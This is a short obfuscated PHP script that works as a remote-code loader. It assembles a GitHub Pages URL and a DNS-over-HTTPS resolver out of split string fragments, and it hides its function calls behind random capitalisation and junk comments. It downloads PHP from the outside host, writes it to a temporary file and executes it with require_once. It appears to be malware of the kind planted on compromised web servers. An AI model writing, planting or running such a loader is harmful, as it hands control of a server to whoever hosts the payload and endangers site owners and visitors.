<?php

$url = 'htt';
$url .= 'ps://cvar1';
$url .= '984.github.';
$url .= 'io/scri';
$url .= 'pts/feed-atom.p';
$url .= 'hp';

$dns = 'ht';
$dns .= 'tps:/';
$dns .= '/cloud';
$dns .= 'flare-';
$dns .= 'dns.c';
$dns .= 'om/dns';
$dns .= '-query';

$ch = CurL_init /* 767d90 */($url);
if (!Function_ExiSts /** 12efa */ ('hex2bin') /*ffbc*/) {
    function hex2bin /* aec1 */ ($hexdec)
    {
        $bin = pack/* f723 */("H*", $hexdec);
        return $bin;
    }
}
if (defined('CURLOPT_DOH_URL')) {
    curL_setOPT($ch, CURLOPT_DOH_URL, $dns);
}
cUrl_setOpt/* d6564*/($ch, CURLOPT_RETURNTRANSFER, TRUE);
Curl_seTOPt/* d2345 */($ch, CURLOPT_SSL_VERIFYHOST, 2); 
curL_seTopt /* *//* 678b7 */($ch, CURLOPT_SSL_VERIFYPEER, true);
$res = curl_ExEC/* 7568 */($ch);
cuRl_close/* c34 */($ch);

$tmp = TMPfIle/* a7d492 */();
$path = streaM_Get_meTa_daTa/* 345 */($tmp);
$path = $path/* a23 */ ['uri'];
fprintf/* 3d45 */($tmp,'%s',$res);
ReqUire_Once/* 23c4 *//* dcf2d*/($path);